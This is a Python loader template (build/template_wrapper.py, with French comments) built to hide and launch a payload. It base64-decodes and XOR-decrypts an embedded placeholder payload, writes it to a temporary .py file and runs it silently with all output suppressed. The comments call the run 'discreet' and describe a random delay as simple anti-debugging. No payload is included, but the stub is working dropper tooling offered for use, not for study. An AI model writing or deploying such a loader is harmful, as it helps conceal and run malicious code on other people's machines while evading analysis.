# build/template_wrapper.py

import base64
import tempfile
import subprocess
import os
import sys
import time
import random

# XOR_KEY sera remplacé dynamiquement
XOR_KEY = 13
encrypted = <ENCRYPTED_B64_PAYLOAD>

def xor_decrypt(data, key):
    return ''.join([chr(ord(c) ^ key) for c in base64.b64decode(data).decode()])

def execute_payload(decoded_code):
    try:
        # Écriture dans un fichier temporaire
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".py") as f:
            f.write(decoded_code)
            temp_path = f.name

        # Exécution discrète
        subprocess.Popen([sys.executable, temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

if __name__ == "__main__":
    # Anti-debug simple + délai aléatoire
    time.sleep(random.randint(2, 7))

    payload = xor_decrypt(encrypted, XOR_KEY)
    execute_payload(payload)
